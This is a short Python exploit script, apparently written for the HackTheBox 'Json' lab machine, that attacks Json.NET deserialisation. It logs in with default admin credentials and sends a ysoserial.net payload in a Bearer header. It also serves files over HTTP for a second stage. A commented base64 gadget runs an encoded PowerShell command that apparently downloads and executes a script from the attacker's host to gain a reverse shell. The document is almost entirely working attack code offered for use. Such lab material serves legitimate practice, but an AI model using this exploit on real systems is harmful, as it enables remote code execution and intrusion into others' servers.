import requests
import argparse
import http.server
import socketserver

parser = argparse.ArgumentParser(description='JSon.Net Deserialisation exploit (Json hackthebox)')
parser.add_argument("--hostname", default='http://10.10.10.158', type=str,
                    help="Login url of Json machine ex: http://10.10.10.158/")
parser.add_argument("--payload", default='', type=str,
                    help="Payload generated with ysoserial.net")

args = parser.parse_args()


def main():
    print("Exploit started, you should have launched your netcat listener before")
    port = 8000
    handler = http.server.SimpleHTTPRequestHandler

    with socketserver.TCPServer(("", port), handler) as httpd:
        print("Serving at port", port)

        session = requests.session()

        session.post(args.hostname + '/api/token', data={"UserName": "admin", "Password": "admin"})

        # "ew0KICAgICckdHlwZSc6J1N5c3RlbS5XaW5kb3dzLkRhdGEuT2JqZWN0RGF0YVByb3ZpZGVyLCBQcmVzZW50YXRpb25Gc"
        # "mFtZXdvcmssIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMz"
        # "Y0ZTM1JywgDQogICAgJ01ldGhvZE5hbWUnOidTdGFydCcsDQogICAgJ01ldGhvZFBhcmFtZXRlcnMnOnsNCiAgICAgICA"
        # "gJyR0eXBlJzonU3lzdGVtLkNvbGxlY3Rpb25zLkFycmF5TGlzdCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3Vs"
        # "dHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5JywNCiAgICAgICAgJyR2YWx1ZXMnOlsnY"
        # "21kJywgJy9jIHBvd2Vyc2hlbGwgLUVuY29kZWRDb21tYW5kIFNRQkZBRmdBS0FCT0FHVUFkd0F0QUU4QVlnQnFBR1VBWX"
        # "dCMEFDQUFUZ0JsQUhRQUxnQlhBR1VBWWdCREFHd0FhUUJsQUc0QWRBQXBBQzRBUkFCdkFIY0FiZ0JzQUc4QVlRQmtBRk1"
        # "BZEFCeUFHa0FiZ0JuQUNnQUp3Qm9BSFFBZEFCd0FEb0FMd0F2QURFQU1BQXVBREVBTUFBdUFERUFOQUF1QURJQU5BQTZB"
        # "RGdBTUFBd0FEQUFMd0JsQUhnQWNBQnNBRzhBYVFCMEFDNEFjQUJ6QUNjQUtRQT0nXQ0KICAgIH0sDQogICAgJ09iamVjd"
        # "Eluc3RhbmNlJzp7JyR0eXBlJzonU3lzdGVtLkRpYWdub3N0aWNzLlByb2Nlc3MsIFN5c3RlbSwgVmVyc2lvbj00LjAuMC"
        # "4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODknfQ0KfQ=="

        payload = {"Bearer": args.payload}

        session.get(args.hostname + '/api/Account', headers=payload)

        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            pass
        httpd.server_close()


main()
